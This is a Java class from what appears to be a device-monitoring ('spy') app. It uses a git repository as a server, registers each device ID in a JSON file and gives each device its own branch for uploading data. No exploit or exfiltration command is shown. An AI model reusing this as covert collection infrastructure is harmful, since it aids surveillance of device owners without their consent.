package com.gameofcoding.spy.server;

import com.gameofcoding.spy.utils.FileUtils;
import com.gameofcoding.spy.utils.XLog;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.eclipse.jgit.api.errors.GitAPIException;
import org.eclipse.jgit.api.errors.InvalidRemoteException;
import org.eclipse.jgit.api.errors.TransportException;
import org.json.JSONArray;
import org.json.JSONException;

/**
 * ServerManager manages all the starting stuff that we need for getting started with upload and
 * download of data.
*/
public class ServerManager {
    private static final String TAG = "ServerManager";
    /*package*/ static final String BRANCH_MASTER = RepoManager.BRANCH_MASTER;
    /*package*/ static final String BRANCH_APP_DATA = "app_data";
    
    /**
     * Name of the file that contains the list of devices that has been added to server.
     */
    private final String ADDED_DEVICES_FILE = "addedDevices.json";

    /**
     * Path to the 
     */
    private File mServerRootDir;
    private String mDeviceBranch;

    private RepoManager mGitRepo = new RepoManager();
    
    public ServerManager(File serverRootDir, String deviceUniqueId) {
	mServerRootDir = serverRootDir;
	mDeviceBranch = deviceUniqueId;
    }

    private boolean downloadGitRepo() throws InvalidRemoteException, TransportException,
					     GitAPIException, IOException {
	if(mServerRootDir.exists()) {
	    if(!FileUtils.deleteForcefully(mServerRootDir))
		return false;
	}
	
	// Remote branches to clone
	List<String> branchesToClone = new ArrayList<String>();
	branchesToClone.add(BRANCH_MASTER);
	branchesToClone.add(BRANCH_APP_DATA);
	
	// Clone repo with above branch and device branch if exists
	if(mGitRepo.clone(mServerRootDir, branchesToClone)) {
	    if(deviceExists()) {
		XLog.i(TAG, "downloadGitRepo(): Device already exists, fetching its remote branch...");
		if(mGitRepo.fetchBranch(mDeviceBranch)) {
		    mGitRepo.createBranch(mDeviceBranch, mDeviceBranch);
		    XLog.i(TAG, "downloadGitRepo(): Fetched device remote branch");
		    return true;
        	} else {
		    XLog.e(TAG, "downloadGitRepo(), Could'nt fetech device remote branch");
		    return false;
		}
	    } else {
		XLog.i(TAG, "Device not added previously, adding device...");
		
		// Create empty local branch an remote branch for device
		mGitRepo.checkoutOrphanBranch(mDeviceBranch);
		mGitRepo.push(mDeviceBranch, mDeviceBranch);
		mGitRepo.setRemoteTrackingBranch(mDeviceBranch, mDeviceBranch);

		// Do entry of device
		mGitRepo.checkout(BRANCH_MASTER);
		addDevice();
		mGitRepo.commit("added device, " + mDeviceBranch);
		mGitRepo.push();
		
		XLog.i(TAG, "Device '" + mDeviceBranch + "' added to server.");
		return true;
            }
	}
	return false;
    }

    private boolean deviceExists() {
	File file = new File(mServerRootDir, ADDED_DEVICES_FILE);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exisr, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		return false;
	    JSONArray devices = new JSONArray(jsonFileData);
	    for(int i = 0; i < devices.length(); i++) {
		String device = devices.getString(i);
		if(device.equals(mDeviceBranch))
		    return true;
	    }
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for checking device ids, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;
    }
    
    private boolean addDevice() {
	File file = new File(mServerRootDir, ADDED_DEVICES_FILE);
	try {
	    if(!file.exists()) {
		XLog.w(TAG, "File that stores added device ids does not exist, creating new one");
		if(!file.createNewFile()) {
		    XLog.w(TAG, "Failed to create file for storing device ids");
		    return false;
		}
	    }
	    FileReader fr = new FileReader(file);
	    BufferedReader br = new BufferedReader(fr);
	    String line;
	    String jsonFileData = "";
	    while((line = br.readLine()) != null)
		jsonFileData += line;
	    br.close();
	    fr.close();
	    if(jsonFileData.isEmpty())
		jsonFileData = "[]";
	    JSONArray devices = new JSONArray(jsonFileData);
	    devices.put(mDeviceBranch);
	    XLog.d(TAG, "devices: " + devices.toString() + ", file: " + file.toString());
	    FileWriter fw = new FileWriter(file);
	    BufferedWriter bw = new BufferedWriter(fw);
	    bw.write(devices.toString());
	    bw.close();
	    fw.close();
	    return true;
	} catch(IOException e) {
	    XLog.e(TAG, "Error occurred while handling file for storing device id, file=" + file, e);
	} catch(JSONException e) {
	    XLog.e(TAG, "Error occurred while parsing json data from file, file=" + file, e);
	}
	return false;	
    }

    public Server loadServer(boolean reloadData) {
	try {
	    boolean hasClonedRepo = false;
	    if(!mServerRootDir.exists()) {
		if(!downloadGitRepo())
		    return null;
		hasClonedRepo = true;
	    }
	    mGitRepo.loadRepo(mServerRootDir);
	    Server server = new Server(mGitRepo, mDeviceBranch);
	    if(!hasClonedRepo && reloadData) {
		XLog.i(TAG, "loadServer(): Syncing all directories with server.");
		server.reloadData();
		XLog.i(TAG, "loadServer(): All directories successfully synced.");
	    }
	    return new Server(mGitRepo, mDeviceBranch);
	} catch(Exception e) {
	    XLog.e(TAG, "loadServer(): Exception occured while loading repo.", e);
	    if(FileUtils.deleteForcefully(mServerRootDir))
		XLog.i(TAG , "loadServer(): Repo directory deleted");
	    else
		XLog.w(TAG, "loadServer(): Repo directory could not be deleted");
	    return null;
	}
    }

    public Server loadServer() {
	return loadServer(false);
    }

    public File getServerRootDir() {
	return mServerRootDir;
    }
}
